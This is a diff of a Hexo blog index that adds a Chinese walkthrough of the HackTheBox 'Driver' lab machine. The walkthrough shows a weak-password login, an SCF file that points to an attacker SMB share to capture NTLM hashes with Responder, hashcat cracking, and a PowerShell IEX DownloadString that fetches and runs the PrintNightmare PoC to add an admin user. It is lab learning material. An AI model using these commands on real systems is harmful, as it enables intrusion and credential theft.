@@ -3,22 +3,10 @@
   <entry>
     <title>Hello World</title>
     <url>/2024/03/15/hello-world/</url>
-    <content><![CDATA[<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+    <content><![CDATA[<p>一个开始。</p>
 ]]></content>
       <tags>
         <tag>blog</tag>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1098,6 +1086,73 @@
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前遇到最简单的windows靶机，虽然开了很多端口但是没什么用，学习到Server Operator权限相关内容，不错</p>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+        <tag>htb</tag>
+        <tag>windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>htb driver复盘</title>
+    <url>/2024/04/10/htb-driver%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<p>📝📝📝</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
+<p>👍：<a class="link"   href="https://npfs06.top/2021/11/28/Hacktehbox-Driver/" >https://npfs06.top/2021/11/28/Hacktehbox-Driver/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >https://m.freebuf.com/articles/web/318970.html<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Driver" >https://app.hackthebox.com/machines/Driver<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：easy</p>
+<p>ip：10.10.11.106</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.106</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085005.png" ></p>
+<p>开的端口不少，有445端口（SMB），5985证明可以用evil-winrm登陆</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085356.png"   style="zoom:30%;" >
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410085439.png" ></p>
+<p>枚举和smbclient都找不到有效信息，而且这个windows版本是10，用不了永恒之蓝（知识点摄入了！）</p>
+<p>看到80端口开放，有个登陆口，猜测是弱口令’admin:admin’，成功了，进入发现是个打印系统</p>
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410084730.png"   style="zoom:50%;" >
+
+<p>扫目录扫不到什么东西，但是很容易找到一个文件上传点，结合前面开的SMB，尝试<strong>通过NTLM捕获进行SMB攻击</strong></p>
+<p><a class="link"   href="https://m.freebuf.com/articles/web/318970.html" >何为通过NTLM捕获进行SMB攻击<i class="fas fa-external-link-alt"></i></a> 这篇文章写的很清楚👍，接下来跟着利用就行</p>
+<p>1.先写一个scf文件（<em>SCF文件</em>是“WINDOWS资源管理器命令”文件，它也是一种可执行文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.3\tools\nc.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>
+
+<p>2.上传恶意文件让网络中的用户（受害者）试图访问我们的共享文件，这时Responder说：请提供给我NTLMv2哈希并访问资源，Responder就收到受害的hash了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -w -I tun0</span><br></pre></td></tr></table></figure>
+
+<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410091850.png"   style="zoom:50%;" >
+
+<p>然后上传scf文件，然后就抓到一串hash</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092123.png" ></p>
+<p>hashcat爆破，爆出密码为liltony</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092222.png" ></p>
+<p>拿着账号密码登陆tony账户，成功拿到第一个flag</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410092334.png" ></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-process # 查看进程</span><br></pre></td></tr></table></figure>
+
+<p>找到一个spoolsv，网上能找到公开漏洞</p>
+<p><a class="link"   href="https://github.com/calebstewart/CVE-2021-1675" >https://github.com/calebstewart/CVE-2021-1675<i class="fas fa-external-link-alt"></i></a></p>
+<p>下载poc放到网站目录下，让靶机下载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.3/CVE-2021-1675.ps1&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>添加一个新的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;abc&quot; -NewPassword &quot;abc123&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-10%2009.29.46.png" ></p>
+<p>查看管理员组，确认权限没问题</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093053.png" ></p>
+<p>再用evil-winRM登陆，这个时候就是管理员权限了，提权成功</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410093255.png" ></p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在历史命令文件中找到RICOH PCL6 UniversalDriver V4.23服务，msf有相关poc可以用</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240410100736.png" ></p>
+<p>但是跟着wp一直利用失败，这里就留一个未解决的事项吧。。。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：80端口通过弱口令–&gt;找到文件上传点–&gt;结合SMB服务进行scf攻击抓到用户密码hash–&gt;发现存在公开漏洞的服务spoolsv&#x2F;ricoh–&gt;l利用公开poc提权</p>
+<p>涉及：smb端口scf攻击，学到了！</p>
+<p>也是尝试了用msf拿到shell，方法二提权失败有待研究，目前花太多时间在这上面，以后再好好研究吧</p>
 ]]></content>
       <tags>
         <tag>复盘</tag>
